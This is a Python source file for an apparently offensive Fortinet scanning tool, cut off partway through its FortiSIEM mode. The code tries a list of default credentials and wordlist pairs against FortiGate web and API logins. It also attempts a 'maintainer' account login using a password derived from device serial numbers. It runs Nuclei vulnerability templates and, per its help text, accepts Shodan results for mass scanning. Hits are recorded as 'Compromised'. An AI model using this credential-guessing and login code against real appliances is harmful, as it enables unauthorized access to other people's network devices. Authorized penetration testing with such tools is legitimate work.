#!/usr/bin/env python3

from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from datetime import datetime
import subprocess
import threading
import requests
import argparse
import shutil
import sys
import json
import time
import re
import os
import tempfile

print_lock = threading.Lock()

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
WHITE = Fore.WHITE
BOLD = Style.BRIGHT
DIM = Style.DIM
RESET = Style.RESET_ALL

BULLET = "•"
ARROW  = "→"
CHECK  = "✓"
CROSS  = "✗"
WARN   = "!"
LOCK   = "🔓"
SHIELD = "🛡"
SKULL  = "💀"
VULN   = "🔥"
CVE_ICON = "⚡"
LINE   = "─"
DOT    = "·"

NUCLEI_TAGS = "fortinet,fortigate,fortios,fortiproxy,forticlient,fortimanager,fortiweb"
NUCLEI_TAGS_FORTISIEM = "fortisiem"
NUCLEI_TAGS_FORTICLIENT = "forticlient,fortinet"
NUCLEI_SEVERITY = "high,critical"
NUCLEI_CONCURRENCY = 50

DEFAULT_CREDS = [
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "fortinet"),
    ("admin", "fortigate"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "changeme"),
    ("admin", "default"),
    ("guest", ""),
    ("guest", "guest"),
    ("monitor", ""),
    ("monitor", "monitor"),
]

OUTPUT_FILE = "forti-exposed.txt"
NUCLEI_OUTPUT_FILE = "forti-nuclei.txt"


def section_header(title, icon=""):
    prefix = f"{icon} " if icon else ""
    print(f"\n  {WHITE}{BOLD}{prefix}{title}{RESET}")
    print(f"  {DIM}{LINE * 55}{RESET}")


def kv(key, value, indent=4):
    pad = 16 - len(key)
    if pad < 1:
        pad = 1
    return f"{' ' * indent}{DIM}{key}{RESET}{' ' * pad}{WHITE}{BOLD}{value}{RESET}"


def banner():
    art = f"""{CYAN}{BOLD}
███████  ██████  ██████  ████████ ██ ███████  █████  ██      ██      
██      ██  ████ ██   ██    ██    ██ ██      ██   ██ ██      ██      
█████   ██ ██ ██ ██████     ██    ██ █████   ███████ ██      ██      
██      ████  ██ ██   ██    ██    ██ ██      ██   ██ ██      ██      
██       ██████  ██   ██    ██    ██ ██      ██   ██ ███████ ███████ 

V: 1.0.0
{RESET}"""
    print(art)
    print(f"  {DIM}Fortinet Security Scanner  {DOT}  c0d3Ninja{RESET}")
    print()


def severity_color(severity):
    s = severity.lower()
    if s == "critical":
        return f"{RED}{BOLD}"
    elif s == "high":
        return f"{RED}"
    elif s == "medium":
        return f"{YELLOW}"
    elif s == "low":
        return f"{CYAN}"
    return f"{DIM}"


def print_config(mode, targets_count, creds_count, threads, timeout, delay, ports, nuclei_tags=None):
    section_header("CONFIGURATION")
    print(kv("Mode", mode.upper()))
    print(kv("Targets", targets_count))
    if mode in ("login", "all"):
        print(kv("Credentials", f"{creds_count} pairs"))
    print(kv("Threads", threads))
    print(kv("Timeout", f"{timeout}s"))
    if delay and mode in ("login", "all"):
        print(kv("Delay", f"{delay}s"))
    if ports:
        print(kv("Ports", ports))
    if mode in ("vuln", "all", "fortisiem", "forticlient"):
        tags = nuclei_tags
        if not tags:
            tags = NUCLEI_TAGS_FORTISIEM if mode == "fortisiem" else NUCLEI_TAGS_FORTICLIENT if mode == "forticlient" else NUCLEI_TAGS
        print(kv("Nuclei Tags", tags))
        print(kv("Severity", NUCLEI_SEVERITY))
    print(kv("Started", datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    print()


def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)
        sys.stdout.flush()


def print_target_header(url, indicators):
    version = indicators.get("version")
    model = indicators.get("model")
    ssl_vpn = indicators.get("ssl_vpn")

    details = []
    if version:
        details.append(f"v{version}")
    if model:
        details.append(f"S/N: {model}")
    if ssl_vpn:
        details.append("SSL-VPN")
    detail_str = f"  {DIM}{DOT} {' {0} '.format(f'{DOT} '.join(details))}{RESET}" if details else ""

    with print_lock:
        print(f"\n  {CYAN}{BOLD}{SHIELD} {url}{RESET}{detail_str}")
        print(f"  {DIM}{LINE * 55}{RESET}")
        sys.stdout.flush()


def print_login_success(url, username, password, method):
    display_pass = password if password else "(blank)"
    safe_print(f"    {GREEN}{CHECK} {username}:{display_pass}{RESET}  {DIM}{method}{RESET}")


def print_login_fail(username, password, status):
    display_pass = password if password else "(blank)"
    safe_print(f"    {DIM}{CROSS} {username}:{display_pass}  {status}{RESET}")


def print_maintainer_hit(url, serial, maint_pass):
    with print_lock:
        print(f"    {RED}{BOLD}{SKULL} maintainer:{maint_pass}{RESET}  {DIM}serial:{serial}{RESET}")
        sys.stdout.flush()


def print_no_creds(url):
    safe_print(f"    {DIM}{CROSS} no default credentials{RESET}")


# ─────────────────────────────────────────────────────────────
#  NUCLEI SCANNER & PARSER
# ─────────────────────────────────────────────────────────────

def check_nuclei():
    path = shutil.which("nuclei")
    if path:
        return path
    common_paths = [
        os.path.expanduser("~/go/bin/nuclei"),
        "/usr/local/bin/nuclei",
        "/usr/bin/nuclei",
    ]
    for p in common_paths:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return None


def parse_nuclei_finding(line):
    try:
        data = json.loads(line)
    except (json.JSONDecodeError, ValueError):
        return None

    finding = {
        "template_id": data.get("template-id", data.get("templateID", "unknown")),
        "name": data.get("info", {}).get("name", "Unknown"),
        "severity": data.get("info", {}).get("severity", "unknown"),
        "host": data.get("host", data.get("url", "")),
        "matched_at": data.get("matched-at", data.get("matched", "")),
        "type": data.get("type", "http"),
        "description": data.get("info", {}).get("description", ""),
        "tags": data.get("info", {}).get("tags", []),
        "reference": data.get("info", {}).get("reference", []),
        "matcher_name": data.get("matcher-name", data.get("matcher_name", "")),
        "extracted_results": data.get("extracted-results", []),
        "curl_command": data.get("curl-command", ""),
        "ip": data.get("ip", ""),
        "timestamp": data.get("timestamp", ""),
    }

    if isinstance(finding["tags"], str):
        finding["tags"] = [t.strip() for t in finding["tags"].split(",")]
    if isinstance(finding["reference"], str):
        finding["reference"] = [finding["reference"]]

    return finding


def print_nuclei_finding(finding):
    sev = finding["severity"]
    sev_c = severity_color(sev)

    host_short = re.sub(r'https?://', '', finding["host"])
    if len(host_short) > 40:
        host_short = host_short[:37] + "..."

    with print_lock:
        print(f"\n  {sev_c}{CVE_ICON} {finding['name']}{RESET}  {sev_c}[{sev.upper()}]{RESET}")
        print(f"  {DIM}{LINE * 55}{RESET}")
        print(kv("Template", finding['template_id']))
        print(kv("Host", host_short))

        if finding["matched_at"]:
            matched_short = finding["matched_at"]
            if len(matched_short) > 50:
                matched_short = matched_short[:47] + "..."
            print(kv("Matched At", matched_short))

        if finding["matcher_name"]:
            print(kv("Matcher", finding['matcher_name']))

        if finding["ip"]:
            print(kv("IP", finding['ip']))

        if finding["extracted_results"]:
            for er in finding["extracted_results"][:3]:
                print(f"    {GREEN}{BOLD}{ARROW} {er}{RESET}")

        if finding["tags"]:
            tags_str = ", ".join(finding["tags"][:6])
            print(f"    {DIM}{tags_str}{RESET}")

        if finding["reference"]:
            for ref in finding["reference"][:3]:
                if ref and ref.startswith("http"):
                    print(f"    {DIM}{ref}{RESET}")

        sys.stdout.flush()


def print_nuclei_results(findings):
    if not findings:
        print(f"\n  {DIM}{WARN} No vulnerabilities found by Nuclei{RESET}")
        return

    critical = [f for f in findings if f["severity"].lower() == "critical"]
    high = [f for f in findings if f["severity"].lower() == "high"]
    medium = [f for f in findings if f["severity"].lower() == "medium"]
    low = [f for f in findings if f["severity"].lower() == "low"]
    affected_hosts = set(f["host"] for f in findings)

    section_header("NUCLEI RESULTS", VULN)
    print(kv("Total", len(findings)))
    if critical:
        print(f"    {RED}{BOLD}Critical        {len(critical)}{RESET}")
    if high:
        print(f"    {RED}High            {len(high)}{RESET}")
    if medium:
        print(f"    {YELLOW}Medium          {len(medium)}{RESET}")
    if low:
        print(f"    {CYAN}Low             {len(low)}{RESET}")
    print(kv("Hosts Affected", len(affected_hosts)))

    if critical or high:
        print(f"\n  {RED}{BOLD}{SKULL} Critical / High{RESET}")
        print(f"  {DIM}{LINE * 55}{RESET}")
        for f in critical + high:
            sev_c = severity_color(f["severity"])
            host_short = re.sub(r'https?://', '', f["host"])
            if len(host_short) > 35:
                host_short = host_short[:32] + "..."
            name = f["name"]
            if len(name) > 40:
                name = name[:37] + "..."
            sev_label = f["severity"].upper()
            print(f"    {sev_c}{sev_label:>8}{RESET}  {WHITE}{name}{RESET}")
            print(f"             {DIM}{ARROW} {host_short}{RESET}")

    print(f"\n  {DIM}{BULLET} Saved to {WHITE}{NUCLEI_OUTPUT_FILE}{RESET}")


def run_nuclei(targets, nuclei_path, tags=None, severity=None, concurrency=None, timeout=10):
    tags = tags or NUCLEI_TAGS
    severity = severity or NUCLEI_SEVERITY
    concurrency = concurrency or NUCLEI_CONCURRENCY

    tmpfile = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, prefix='forti_targets_')
    try:
        for t in targets:
            tmpfile.write(f"{t}\n")
        tmpfile.close()

        jsonl_out = tempfile.NamedTemporaryFile(mode='w', suffix='.jsonl', delete=False, prefix='forti_nuclei_')
        jsonl_out.close()

        cmd = [
            nuclei_path,
            "-l", tmpfile.name,
            "-tags", tags,
            "-severity", severity,
            "-c", str(concurrency),
            "-timeout", str(timeout),
            "-jsonl",
            "-o", jsonl_out.name,
            "-silent",
        ]

        section_header("NUCLEI SCAN", VULN)
        print(kv("Tags", tags))
        print(kv("Severity", severity))
        print(kv("Concurrency", concurrency))
        print(kv("Targets", len(targets)))
        print()

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        findings = []

        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            line = line.strip()
            if line:
                finding = parse_nuclei_finding(line)
                if finding:
                    findings.append(finding)
                    print_nuclei_finding(finding)

        process.wait()

        if os.path.exists(jsonl_out.name):
            with open(jsonl_out.name, 'r') as jf:
                for line in jf:
                    line = line.strip()
                    if line:
                        finding = parse_nuclei_finding(line)
                        if finding and finding not in findings:
                            already_seen = any(
                                f["template_id"] == finding["template_id"] and f["host"] == finding["host"]
                                for f in findings
                            )
                            if not already_seen:
                                findings.append(finding)
                                print_nuclei_finding(finding)

        with open(NUCLEI_OUTPUT_FILE, "a") as out:
            for f in findings:
                sev = f["severity"].upper()
                out.write(f"[{sev}] {f['name']} | {f['host']} | {f['template_id']}")
                if f["matched_at"]:
                    out.write(f" | {f['matched_at']}")
                if f["extracted_results"]:
                    out.write(f" | extracted: {', '.join(f['extracted_results'][:3])}")
                out.write("\n")

        return findings

    finally:
        try:
            os.unlink(tmpfile.name)
        except OSError:
            pass
        try:
            os.unlink(jsonl_out.name)
        except OSError:
            pass


# ─────────────────────────────────────────────────────────────
#  LOGIN SCANNER
# ─────────────────────────────────────────────────────────────

def detect_fortigate(url, timeout=10):
    indicators = {
        "panel": False,
        "version": None,
        "ssl_vpn": False,
        "model": None,
    }

    try:
        resp = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)

        if any(sig in resp.text for sig in ["FortiGate", "fortinet", "fgt_lang", "APSCOOKIE"]):
            indicators["panel"] = True

        if "Set-Cookie" in resp.headers:
            cookies = resp.headers.get("Set-Cookie", "")
            if "APSCOOKIE" in cookies:
                indicators["panel"] = True

        server = resp.headers.get("Server", "")
        if "xxxxxxxx-xxxxx" in server.lower() or "fortinet" in server.lower():
            indicators["panel"] = True

    except Exception:
        pass

    try:
        vpn_resp = requests.get(
            f"{url}/remote/login",
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        if vpn_resp.status_code in [200, 301, 302] and any(
            s in vpn_resp.text for s in ["SSL-VPN", "FortiGate", "sslvpn"]
        ):
            indicators["ssl_vpn"] = True
            indicators["panel"] = True
    except Exception:
        pass

    try:
        info_resp = requests.get(
            f"{url}/api/v2/cmdb/system/status",
            timeout=timeout,
            verify=False,
        )
        if info_resp.status_code == 200:
            try:
                data = info_resp.json()
                indicators["version"] = data.get("version", None)
                indicators["model"] = data.get("serial", None)
            except (json.JSONDecodeError, ValueError):
                pass
    except Exception:
        pass

    return indicators


def verify_session(session, url, timeout=10):
    verify_endpoints = [
        "/api/v2/cmdb/system/global",
        "/api/v2/monitor/system/status",
        "/api/v2/cmdb/system/admin",
    ]
    for endpoint in verify_endpoints:
        try:
            resp = session.get(f"{url}{endpoint}", timeout=timeout, verify=False)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get("status") == "success" or data.get("http_status") == 200:
                        return True
                    if "results" in data or "version" in data or "serial" in data:
                        return True
                except (json.JSONDecodeError, ValueError):
                    pass
            if resp.status_code == 401 or resp.status_code == 403:
                return False
        except Exception:
            continue
    return False


def try_login_web(url, username, password, timeout=10):
    login_url = f"{url}/logincheck"
    payload = {"ajax": "1", "username": username, "secretkey": password}

    try:
        session = requests.Session()
        session.get(url, timeout=timeout, verify=False)

        resp = session.post(
            login_url,
            data=payload,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )

        cookies = resp.headers.get("Set-Cookie", "")
        body = resp.text.strip()

        if "ret=failed" in body or "redir=/login" in body or "err=" in body:
            return False, "failed", resp.status_code

        login_looks_good = False

        if "ccsrftoken" in cookies.lower():
            login_looks_good = True

        if not login_looks_good and resp.status_code == 302:
            location = resp.headers.get("Location", "")
            if ("/ng/" in location or "/dashboard" in location) and "/login" not in location:
                login_looks_good = True

        if not login_looks_good and body == "1":
            login_looks_good = True

        if login_looks_good:
            if verify_session(session, url, timeout):
                return True, "web_ui_verified", resp.status_code
            return False, "false_positive", resp.status_code

    except requests.exceptions.Timeout:
        return False, "timeout", 0
    except Exception as e:
        return False, str(e), 0

    return False, "failed", resp.status_code


def try_login_api(url, username, password, timeout=10):
    api_url = f"{url}/api/v2/authentication"
    payload = {"username": username, "secretkey": password}

    try:
        session = requests.Session()
        resp = session.post(
            api_url,
            json=payload,
            timeout=timeout,
            verify=False,
        )

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("status") == "success" or "session" in str(data).lower():
                    if verify_session(session, url, timeout):
                        return True, "api_verified", resp.status_code
                    return False, "false_positive", resp.status_code
            except (json.JSONDecodeError, ValueError):
                pass

    except requests.exceptions.Timeout:
        return False, "timeout", 0
    except Exception as e:
        return False, str(e), 0

    return False, "failed", resp.status_code


def extract_ssl_serial(url, timeout=10):
    try:
        import ssl
        import socket
        from urllib.parse import urlparse

        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or 443

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                if cert:
                    subject = dict(x[0] for x in cert.get("subject", []))
                    cn = subject.get("commonName", "")
                    match = re.search(r'(FG[A-Z0-9]{10,}|FGT[A-Z0-9]+|FWF[A-Z0-9]+|FAZ[A-Z0-9]+)', cn)
                    if match:
                        return match.group(1)

                    for san_type, san_value in cert.get("subjectAltName", []):
                        match = re.search(r'(FG[A-Z0-9]{10,}|FGT[A-Z0-9]+|FWF[A-Z0-9]+|FAZ[A-Z0-9]+)', san_value)
                        if match:
                            return match.group(1)
    except Exception:
        pass
    return None


def check_maintainer(url, timeout=10):
    login_url = f"{url}/logincheck"
    serials = []

    try:
        resp = requests.get(url, timeout=timeout, verify=False)
        page = resp.text

        for match in re.finditer(r'(FG[A-Z0-9]{10,}|FGT[A-Z0-9]+|FWF[A-Z0-9]+)', page):
            serials.append(match.group(1))

        serial_header = resp.headers.get("X-Fortigate-Serial", "")
        if serial_header:
            serials.append(serial_header)

    except Exception:
        pass

    try:
        api_resp = requests.get(f"{url}/api/v2/cmdb/system/status", timeout=timeout, verify=False)
        if api_resp.status_code == 200:
            data = api_resp.json()
            serial = data.get("serial", "")
            if serial:
                serials.append(serial)
    except Exception:
        pass

    ssl_serial = extract_ssl_serial(url, timeout)
    if ssl_serial:
        serials.append(ssl_serial)

    serials = list(dict.fromkeys(serials))

    for serial in serials:
        try:
            maint_pass = f"bcpb{serial}"
            payload = {"ajax": "1", "username": "maintainer", "secretkey": maint_pass}
            session = requests.Session()
            login_resp = session.post(
                login_url, data=payload, timeout=timeout, verify=False, allow_redirects=False
            )
            cookies = login_resp.headers.get("Set-Cookie", "")
            if "ccsrftoken" in cookies.lower() or login_resp.status_code == 302:
                return True, serial, maint_pass
        except Exception:
            continue

    return False, None, None


def expand_target(target, ports=None):
    target = target.strip().rstrip("/")

    if target.startswith("http://") or target.startswith("https://"):
        return [target]

    if ":" in target and not target.startswith("["):
        host, port = target.rsplit(":", 1)
        if port.isdigit():
            scheme = "http" if port in ("80", "8080") else "https"
            return [f"{scheme}://{host}:{port}"]

    if ports:
        urls = []
        for port in ports:
            scheme = "http" if port in (80, 8080) else "https"
            urls.append(f"{scheme}://{target}:{port}")
        return urls

    return [f"https://{target}", f"https://{target}:8443", f"https://{target}:10443"]


def get_default_ports(mode="fortigate"):
    """Default ports per product. FortiSIEM/FortiClient: 443,8443; FortiGate: 443,8443,10443."""
    if mode in ("fortisiem", "forticlient"):
        return [443, 8443]
    return [443, 8443, 10443]


def detect_fortisiem(url, timeout=10):
    """Fingerprint FortiSIEM from web UI/headers. Returns panel, version."""
    indicators = {"panel": False, "version": None}

    try:
        resp = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
        text = resp.text.lower()

        if any(s in text for s in ["fortisiem", "phfortisiem", "phmonitor", "phoenix/rest"]):
            indicators["panel"] = True
        if "fortisiem" in resp.headers.get("Server", "").lower():
            indicators["panel"] = True

        # Try to extract version from page/JS
        ver_m = re.search(r"fortisiem[_\s-]?v?(\d+\.\d+\.\d+)", text, re.I)
        if ver_m:
            indicators["version"] = ver_m.group(1)
        ver_m = re.search(r"version['\"]\s*:\s*['\"]?(\d+\.\d+\.\d+)", text, re.I)
        if ver_m:
            indicators["version"] = indicators["version"] or ver_m.group(1)
    except Exception:
        pass

    return indicators


def detect_forticlient_ems(url, timeout=10):
    """Fingerprint FortiClient EMS from web UI/headers. Returns panel, version."""
    indicators = {"panel": False, "version": None}

    urls_to_try = [url.rstrip("/"), f"{url.rstrip('/')}/signin"]

    for check_url in urls_to_try:
        try:
            resp = requests.get(check_url, timeout=timeout, verify=False, allow_redirects=True)
            text = resp.text

            if "FortiClient Endpoint Management Server" in text:
                indicators["panel"] = True
                # Extract version from VERSION_FULL in page/JS (Nuclei-style)
                ver_m = re.search(r'VERSION_FULL["\s:]+["\']?([^"\'}\s]+)["\']?', text, re.I)
                if ver_m:
                    indicators["version"] = ver_m.group(1).strip()
                if not indicators["version"]:
                    ver_m = re.search(r"forticlient[_\s-]?ems?[_\s-]?v?(\d+\.\d+\.\d+)", text, re.I)
                    if ver_m:
                        indicators["version"] = ver_m.group(1)
                break
        except Exception:
            continue

    try:
        resp = requests.get(url, timeout=timeout, verify=False, allow_redirects=False)
        server = resp.headers.get("Server", "").lower()
        if "forticlient" in server or "ems" in server:
            indicators["panel"] = True
    except Exception:
        pass

    return indicators


def scan_target(target, creds, timeout=10, verbose=False, delay=0):
    url = target.rstrip("/")
    if not url.startswith("http"):
        url = f"https://{url}"

    results = {
        "target": url,
        "is_fortigate": False,
        "version": None,
        "model": None,
        "ssl_vpn": False,
        "vulns": [],
    }

    indicators = detect_fortigate(url, timeout)
    results["is_fortigate"] = indicators["panel"]
    results["version"] = indicators["version"]
    results["model"] = indicators["model"]
    results["ssl_vpn"] = indicators["ssl_vpn"]

    if not indicators["panel"]:
        return results

    print_target_header(url, indicators)

    for username, password in creds:
        if delay > 0:
            time.sleep(delay)

        display_pass = password if password else "(blank)"

        success, method, status = try_login_web(url, username, password, timeout)
        if success:
            print_login_success(url, username, password, method)
            results["vulns"].append({
                "type": "default_login",
                "username": username,
                "password": password,
                "method": method,
            })
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"{url} | {username}:{display_pass} | {method}\n")
            continue

        success, method, status = try_login_api(url, username, password, timeout)
        if success:
            print_login_success(url, username, password, method)
            results["vulns"].append({
                "type": "api_login",
                "username": username,
                "password": password,
                "method": method,
            })
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"{url} | {username}:{display_pass} | {method}\n")
            continue

        if verbose:
            print_login_fail(username, password, status)

    maint_success, serial, maint_pass = check_maintainer(url, timeout)
    if maint_success:
        print_maintainer_hit(url, serial, maint_pass)
        results["vulns"].append({
            "type": "maintainer",
            "serial": serial,
            "password": maint_pass,
        })
        with open(OUTPUT_FILE, "a") as f:
            f.write(f"{url} | maintainer:{maint_pass} | maintainer_account | serial:{serial}\n")

    if not results["vulns"]:
        if verbose:
            print_no_creds(url)

    return results


def print_login_results(all_results, start_time):
    vulnerable = [r for r in all_results if r["vulns"]]
    fortigate_count = sum(1 for r in all_results if r["is_fortigate"])
    elapsed = time.time() - start_time

    if elapsed >= 60:
        time_str = f"{int(elapsed // 60)}m {int(elapsed % 60)}s"
    else:
        time_str = f"{elapsed:.1f}s"

    section_header("LOGIN RESULTS", LOCK)
    print(kv("Scanned", len(all_results)))
    print(kv("FortiGate", fortigate_count))

    if vulnerable:
        print(f"    {GREEN}{BOLD}Vulnerable      {len(vulnerable)}{RESET}")
    else:
        print(f"    {DIM}Vulnerable      0{RESET}")

    print(kv("Elapsed", time_str))

    if vulnerable:
        print(f"\n  {RED}{BOLD}{SKULL} Compromised{RESET}")
        print(f"  {DIM}{LINE * 55}{RESET}")
        for v in vulnerable:
            target_short = re.sub(r'https?://', '', v['target'])
            for vuln in v["vulns"]:
                if vuln["type"] == "maintainer":
                    print(f"    {RED}{BOLD}{target_short}{RESET}")
                    print(f"      {RED}{ARROW} maintainer:{vuln['password']}{RESET}")
                    if vuln.get("serial"):
                        print(f"      {DIM}serial: {vuln['serial']}{RESET}")
                else:
                    pwd = vuln["password"] if vuln["password"] else "(blank)"
                    print(f"    {GREEN}{BOLD}{target_short}{RESET}")
                    print(f"      {GREEN}{ARROW} {vuln['username']}:{pwd}{RESET}  {DIM}[{vuln['method']}]{RESET}")
    else:
        print(f"\n  {DIM}{WARN} No vulnerable targets found{RESET}")

    if vulnerable:
        print(f"\n  {DIM}{BULLET} Saved to {WHITE}{OUTPUT_FILE}{RESET}")


# ─────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────

def load_custom_creds(userfile=None, passfile=None):
    creds = []

    if userfile and passfile:
        try:
            with open(userfile) as uf:
                users = [u.strip() for u in uf if u.strip()]
            with open(passfile) as pf:
                passwords = [p.strip() for p in pf if p.strip()]
            for u in users:
                for p in passwords:
                    creds.append((u, p))
        except FileNotFoundError as e:
            print(f"  {RED}{CROSS} File not found: {e}{RESET}")
            sys.exit(1)
    elif userfile:
        try:
            with open(userfile) as uf:
                users = [u.strip() for u in uf if u.strip()]
            for u in users:
                creds.append((u, ""))
        except FileNotFoundError as e:
            print(f"  {RED}{CROSS} File not found: {e}{RESET}")
            sys.exit(1)

    return creds


def main():
    parser = argparse.ArgumentParser(
        description="Fortinet Security Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  login     Check for default/weak credentials only
  vuln      Run Nuclei vulnerability scan only
  all       Run both login check and Nuclei scan (default)
  fortisiem   FortiSIEM fingerprinting + Nuclei scan (fortisiem tag only)
  forticlient FortiClient EMS fingerprinting + Nuclei scan (forticlient,fortinet tags)

Examples:
  python3 forticheck.py -u 10.0.0.1 -m login
  python3 forticheck.py -f targets.txt -m vuln
  python3 forticheck.py -f targets.txt -m all -t 20
  python3 forticheck.py -u 10.0.0.1 -m login -U users.txt -P passwords.txt
  python3 forticheck.py -f ips.txt -m vuln --nuclei-tags fortinet,fortigate
  python3 forticheck.py -f ips.txt -m vuln --severity critical
  cat ips.txt | python3 forticheck.py --stdin -m all -t 20
  shodan search 'ssl:"FortiGate"' --fields ip_str | python3 forticheck.py --stdin -m vuln
  python3 forticheck.py -f fortisiem_hosts.txt -m fortisiem
  python3 forticheck.py -f ems_hosts.txt -m forticlient
        """,
    )
    parser.add_argument("-u", "--url", help="Single target URL or IP")
    parser.add_argument("-f", "--file", help="File with targets (one per line)")
    parser.add_argument("--stdin", action="store_true", help="Read targets from stdin")
    parser.add_argument("-m", "--mode", choices=["login", "vuln", "all", "fortisiem", "forticlient"], default="all", help="Scan mode (default: all)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Thread count (default: 5)")
    parser.add_argument("-p", "--ports", help="Ports to scan for raw IPs (comma-separated, default: 443,8443,10443)")
    parser.add_argument("-U", "--userlist", help="Custom username wordlist")
    parser.add_argument("-P", "--passlist", help="Custom password wordlist")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--delay", type=float, default=0, help="Delay between login attempts in seconds (default: 0)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--json", action="store_true", help="Output results as JSON")
    parser.add_argument("-o", "--output", help="Output file path")
    parser.add_argument("--no-defaults", action="store_true", help="Skip default credential list (use with -U/-P)")
    parser.add_argument("--no-maintainer", action="store_true", help="Skip maintainer account check")
    parser.add_argument("--nuclei-tags", help="Nuclei tags (default: mode-specific; fortisiem/forticlient use product tags)")
    parser.add_argument("--severity", default=NUCLEI_SEVERITY, help=f"Nuclei severity filter (default: {NUCLEI_SEVERITY})")
    parser.add_argument("--nuclei-concurrency", type=int, default=NUCLEI_CONCURRENCY, help=f"Nuclei concurrency (default: {NUCLEI_CONCURRENCY})")
    parser.add_argument("--nuclei-path", help="Path to nuclei binary (auto-detected if not set)")

    banner()
    args = parser.parse_args()

    if not args.url and not args.file and not args.stdin:
        parser.print_help()
        sys.exit(1)

    if args.nuclei_tags:
        NUCLEI_TAGS_RUNTIME = args.nuclei_tags
    elif args.mode == "fortisiem":
        NUCLEI_TAGS_RUNTIME = NUCLEI_TAGS_FORTISIEM
    elif args.mode == "forticlient":
        NUCLEI_TAGS_RUNTIME = NUCLEI_TAGS_FORTICLIENT
    else:
        NUCLEI_TAGS_RUNTIME = NUCLEI_TAGS
    NUCLEI_SEVERITY_RUNTIME = args.severity

    if args.mode in ("vuln", "all", "fortisiem", "forticlient"):
        nuclei_bin = args.nuclei_path or check_nuclei()
        if not nuclei_bin:
            print(f"  {RED}{CROSS} Nuclei not found. Install: https://github.com/projectdiscovery/nuclei{RESET}")
            if args.mode in ("vuln", "fortisiem", "forticlient"):
                sys.exit(1)
            else:
                print(f"  {YELLOW}{WARN} Falling back to login mode only{RESET}\n")
                args.mode = "login"

    creds = []
    if args.mode in ("login", "all"):
        if not args.no_defaults:
            creds.extend(DEFAULT_CREDS)

        custom = load_custom_creds(args.userlist, args.passlist)
        if custom:
            creds.extend(custom)

        if not creds:
            if args.mode == "login":
                print(f"  {RED}{CROSS} No credentials to test. Provide -U/-P or remove --no-defaults{RESET}")
                sys.exit(1)

        seen = set()
        unique_creds = []
        for c in creds:
            if c not in seen:
                seen.add(c)
                unique_creds.append(c)
        creds = unique_creds

    custom_ports = None
    if args.ports:
        custom_ports = [int(p.strip()) for p in args.ports.split(",")]
    elif args.mode in ("fortisiem", "forticlient"):
        custom_ports = get_default_ports(args.mode)

    raw_targets = []
    if args.url:
        raw_targets.append(args.url)
    elif args.file:
        try:
            with open(args.file) as f:
                raw_targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print(f"  {RED}{CROSS} File not found: {args.file}{RESET}")
            sys.exit(1)
    elif args.stdin:
        raw_targets = [line.strip() for line in sys.stdin if line.strip() and not line.startswith("#")]

    targets = []
    for t in raw_targets:
        targets.extend(expand_target(t, custom_ports))

    default_ports = get_default_ports(args.mode if args.mode in ("fortisiem", "forticlient") else "fortigate")
    port_display = args.ports if args.ports else ", ".join(str(p) for p in default_ports)
    creds_count = len(creds) if args.mode in ("login", "all") else 0
    print_config(args.mode, len(targets), creds_count, args.threads, args.timeout, args.delay, port_display, nuclei_tags=NUCLEI_TAGS_RUNTIME)

    start_time = time.time()

    # ── LOGIN MODE ──
    all_results = []
    fortisiem_discoveries = []
    forticlient_discoveries = []
    if args.mode in ("login", "all"):
        section_header("LOGIN CHECK", LOCK)

        if len(targets) == 1:
            result = scan_target(targets[0], creds, args.timeout, args.verbose, args.delay)
            all_results.append(result)
        else:
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = {
                    executor.submit(scan_target, t, creds, args.timeout, args.verbose, args.delay): t
                    for t in targets
                }
                for future in as_completed(futures):
                    t = futures[future]
                    try:
                        result = future.result()
                        all_results.append(result)
                    except Exception as e:
                        if args.verbose:
                            safe_print(f"\n  {RED}{CROSS} {t} — Error: {e}{RESET}")
            sys.stdout.write("\r" + " " * 80 + "\r")
            sys.stdout.flush()

        print_login_results(all_results, start_time)

    # ── FORTISIEM MODE ──
    if args.mode == "fortisiem":
        section_header("FORTISIEM FINGERPRINT", SHIELD)
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(detect_fortisiem, t, args.timeout): t
                for t in targets
            }
            for future in as_completed(futures):
                target = futures[future]
                try:
                    ind = future.result()
                    if ind["panel"]:
                        ver_str = f" v{ind['version']}" if ind["version"] else ""
                        host_short = re.sub(r"https?://", "", target)
                        safe_print(f"    {GREEN}{CHECK} FortiSIEM detected{RESET}  {DIM}{ARROW} {host_short}{ver_str}{RESET}")
                        fortisiem_discoveries.append({"url": target, "version": ind["version"]})
                    elif args.verbose:
                        host_short = re.sub(r"https?://", "", target)
